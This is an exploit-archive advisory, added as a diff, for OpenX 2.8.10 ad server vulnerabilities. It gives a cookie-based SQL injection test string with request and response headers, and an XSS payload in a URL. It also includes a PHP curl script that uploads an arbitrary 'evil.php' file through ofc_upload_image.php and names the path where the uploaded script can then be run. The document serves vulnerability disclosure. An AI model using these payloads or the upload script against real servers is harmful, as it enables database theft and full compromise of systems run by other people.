@@ -1,0 +1,150 @@
+id: 21128
+date: 08/18/2013
+title: OpenX 2.8.10 Cross Site Scripting / SQL Injection Vulnerabilities
+author: Esac
+cves: 
+
+###########################################################################################
+# Exploit Title: OpenX 2.8.10 - Multiples Vulnerabilites
+#Product: OpenX
+#Vulnerable Version(s): 2.8.10 and probably prior
+#Tested Version: 2.8.10
+#Official site: http://www.openx.com
+#Risk Level: High 
+#Exploit Author: Esac
+#Last Checked: 12/08/2013
+###########################################################################################
+
+
++----------+
+| OVERVIEW |
++----------+
+
+OpenX Source is open-source advertising server that is licensed under the GNU General Public License. It features an integrated banner management interface and tracking system for gathering statistics.
+The software enables web site administrators to rotate banners from both in-house advertisement campaigns as well as from paid or third-party sources, such as Google's AdSense. OpenX provides standard banner rotation, click tracking, zone-based ad selection, zone-based campaign targeting, direct ad selection, ad targeting (per browser, domain, language, etc.), ad capping and support for Adobe Flash banners.
+
+
++-----------------------------------------------------------------------------------+
+
++----------------------------+
+| Cookie-based SQL Injection |
++----------------------------+
+
+Openx is possibly vulnerable to SQL Injection attacks and Cookie Poisoning  Attack
+
+
++------------------+
+| affected files   |
++------------------+
+
+http://localhost/pub/www/admin/index.php
+http://localhost/pub/www/admin/password-recovery.php
+http://localhost/pub/www/admin/plugins/openXWorkflow/public/
+http://localhost/pub/www/admin/plugins/oxMarket/market-campaign-acl.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-campaign-edit.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-campaigns-settings-list.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-campaigns-settings.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-common.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-confirm.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-dismiss.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-inactive.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-include.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-index.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-info.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-preferences-website.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-quality-tool.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-run-registerwebsites.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-signup.php
+http://localhost/pub/www/admin/plugins/oxMarket/market-sso-user-exists.php
+http://localhost/pub/www/admin/plugins/videoReport/players.php
+http://localhost/pub/www/admin/plugins/videoReport/stats-video.php
+http://localhost/pub/www/admin/plugins/videoReport/zone-invocation-code.php
+
+
+
++------------------+
+| PROOF OF CONCEPT |
++------------------+
+
+the vuln affects Cookie input sessionID , when we set it to 1'" we have an error msg : 
+[Native message: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"'' at line 6]
+
+
++---------------------+
+| HTTP HEADERS REQUET |
++---------------------+
+
+
+Host: http://localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: sessionID=1'"; 8812c36aa5ae336c2a77bf63211d899a=9VYridsNeoI=LAdQS8hhJ9E=BilZkQU1KHc=4Kb906btH5s=dZpwZtUj098=gcaHLE4lD7k=MMlfZM1j50o=Qy7lYX6jVNA=KalE2nL07lA=oZe8ZoVDb+c=ffTaZI1jYzk=4Dec1TnHYTs=ukkJLma0ylU=aRciEA3rgJM=U9LoRAcfT8k=000115
+Connection: keep-alive
+
++-----------------------+
+| HTTP HEADERS RESPONSE |
++-----------------------+
+
+Response
+HTTP/1.1 200 OK
+Date: Sun, 12 Aug 2013 14:21:49 GMT
+Server: Apache/2.2.24 (Unix) mod_ssl/2.2.24 OpenSSL/0.9.8e-fips-rhel5 mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 mod_jk/1.2.35 PHP/5.2.17
+X-Powered-By: PHP/5.2.17
+Content-Length: 5163
+Keep-Alive: timeout=5, max=80
+Connection: Keep-Alive
+Content-Type: text/html
+
+
++--------------------------------+
+The impact of this vulnerability |
++--------------------------------+
+
+An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. 
+
++--------------------------------------------------------------------------------------+
+
++----------+
+XSS Attack |
++----------+
+
+http://localhost/pub/www/admin/plugins/videoReport/lib/ofc2/ofc_upload_image.php?name=<video><source onerror="javascript:prompt(007)">
+
++--------------------------------------------------------------------------------------+
+
++----------------------------+
+Remote Arbitrary File Upload |
++----------------------------+
+
+An attacker can upload arbitrary scripts on the web server and execute them. This can lead to a full system compromise.
+
+affected file :  /pub/www/admin/plugins/videoReport/lib/ofc2/ofc_upload_image.php
+
++------------+
+Exploitation |
++------------+
+
+<?php
+  $target_url = 'http://localhost/pub/www/admin/plugins/videoReport/lib/ofc2/ofc_upload_image.php';
+  $file_name_with_full_path = realpath('real path of evil.php');
+  $post = array('extra_info' => '123456','Filedata'=>'@'.$file_name_with_full_path);
+    $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL,$target_url);
+  curl_setopt($ch, CURLOPT_POST,1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  $result=curl_exec($ch);
+  curl_close ($ch);
+  echo '<br>'.$result;
+?>
+
+after uploading the evil file , u gonna find it on : http://localhost/pub/www/admin/plugins/videoReport/lib/ofc2/tmp-upload-images/evil.php
+
++--------------------------------------------------------------------------------------+
+
+==> Made In Moroco <==
+Greetz : White Tarbouch TEAM - Cobra 
+./Issam IEBOUBEN Aka Esac
+
+#  0day.today [2023-03-26]  #
